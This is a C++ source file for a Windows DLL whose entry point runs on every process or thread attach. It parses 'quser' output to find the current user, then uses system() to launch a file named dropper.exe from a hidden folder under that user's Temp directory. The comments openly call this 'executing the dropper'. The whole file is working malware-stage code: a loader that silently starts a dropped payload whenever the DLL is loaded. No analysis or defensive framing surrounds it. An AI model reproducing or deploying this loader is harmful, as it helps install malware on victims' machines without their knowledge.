// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <string>
#include <iostream>
#include <vector>
#include <sstream>
#include <array>
#include <fstream>

// Simple function to execute a command and get its output on stdout
std::string exec(const char* cmd) {
    std::array<char, 128> buffer;
    std::string result;
    std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(cmd, "r"), _pclose);
    if (!pipe) {
        throw std::runtime_error("popen() failed!");
    }
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }
    return result;
}

// Simple function to split a string using a delimiter. Returns a vector of strings containing all the substrings
std::vector<std::string> split(const std::string& s, char delim) {
    std::stringstream ss(s);
    std::string item;
    std::vector<std::string> elems;
    while (std::getline(ss, item, delim)) {
        elems.push_back(item);
    }
    return elems;
}

// main function
void main()
{   
    std::string result = exec("quser"); // Execute user
    std::vector<std::string> elems = split(result, '\n'); // split output of quser
    std::string& string2 = elems[1]; // Get first element of split (first line)
    std::vector<std::string> elems2 = split(string2, ' '); // Split the first line using white space
    std::string user = elems2[1]; // Get the first element in the split, here the current user
    user.erase(remove(user.begin(), user.end(), '>'), user.end()); // Remove the '>' character in front of the user
    std::string path = "C:\\Users\\" + user + "\\AppData\\Local\\Temp\\tmp01dvb5\\dropper.exe"; // Create the path using the user that we gathered previously
    const char* path2 = path.c_str(); // Get the path in char* instead of string type (required for system command)
    system(path2); // Executing the dropper
}

//Main function of the dll
BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH: {
        main(); // Calling main function
        break;
    }
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return FALSE;
}

